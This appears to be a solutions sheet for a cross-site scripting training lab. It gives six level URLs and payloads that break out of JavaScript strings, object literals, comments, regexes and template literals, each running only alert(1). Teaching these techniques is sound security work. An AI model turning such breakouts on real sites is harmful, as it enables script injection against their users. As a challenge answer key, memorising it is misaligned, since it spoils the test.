# timing — solutions

Reflection in various JS literal contexts (string, object key, comment, regex, template).

### timing-level1

`/timing/level1/?query=%22;alert(1);//`

- payload: `";alert(1);//`
- context: inside `var x = "..."` — close double-quoted JS string

### timing-level2

`/timing/level2/?query=x:1%7D%3Balert(1)%3B//`

- payload: `x:1};alert(1);//`
- context: inside an object literal; finish a key, close the object, then run

### timing-level3

`/timing/level3/?query=%0Aalert(1)//`

- payload: `<newline>alert(1)//`
- context: after `//` line comment — real newline ends comment

### timing-level4

`/timing/level4/?query=x/%3Balert(1)//`

- payload: `x/;alert(1)//`
- context: inside `var re = /.../`; close the regex with content first

### timing-level5

`/timing/level5/?query=%27;alert(1);//`

- payload: `';alert(1);//`
- context: inside `var msg = '...'` — close single-quoted JS string

### timing-level6

`/timing/level6/?query=$%7Balert(1)%7D`

- payload: `${alert(1)}`
- context: inside `\`Hello ...\`` template literal — interpolation
